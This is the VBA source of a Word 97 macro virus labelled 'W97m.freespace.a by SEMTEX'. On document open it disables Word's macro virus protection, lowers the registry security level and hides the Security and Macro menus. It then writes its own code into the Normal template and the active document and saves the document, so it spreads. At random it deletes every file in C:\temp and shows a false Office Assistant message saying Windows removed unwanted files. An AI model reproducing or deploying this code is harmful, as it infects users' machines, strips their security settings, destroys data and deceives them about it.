   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "Lisa"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   'W97m.freespace.a by SEMTEX
   Private Sub Document_Open()
    On Error Resume Next
    Set Code = New DataObject
    Options.ConfirmConversions = 0
    Options.SaveNormalPrompt = 0
    Options.VirusProtection = 0

    With Application
    .StatusBar = "READY"
    End With

     If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
        CommandBars("Macro").Controls("Security...").Enabled = 0
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
     End If
    CommandBars("Tools").Controls("Macro").Enabled = 0
     If NormalTemplate.VBProject.VBComponents(1).Name = "Lisa" Then
       callitn = True
      Else
       Set A = NormalTemplate.VBProject.VBComponents(1)
     End If
     If ActiveDocument.VBProject.VBComponents(1).Name = "Lisa" Then
       callita = True
      Else
       Set A = ActiveDocument.VBProject.VBComponents(1)
       saveit = True
     End If
     Set ab = A.CodeModule
      Code.SetText Lisa.VBProject.VBComponents(1).CodeModule.Lines(1, Lisa.VBProject.VBComponents(1).CodeModule.CountOfLines)
      ab.DeleteLines 1, ab.CountOfLines
      ab.InsertLines 1, Code.GetText
      A.Name = "Lisa"
      If callitn = True And callita = True Then
       If Int(Rnd * 5) = 2 Then
         Call Lisa_payload
       End If
      End If
     If saveit = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
   End Sub
   Private Sub Lisa_payload()
   On Error Resume Next

   DoEvents
   Randomize
   If Int(Rnd * 500) = 2 Then

    Kill "C:\\temp\*.*"

    Assistant.Visible = True
   With Assistant.NewBalloon
       .Button = msoButtonSetOK
       .Heading = "READY"
       .Text = "Windows has just deleted any unwanted files to create freespace"
       .Show
   End With

   End If

   End Sub
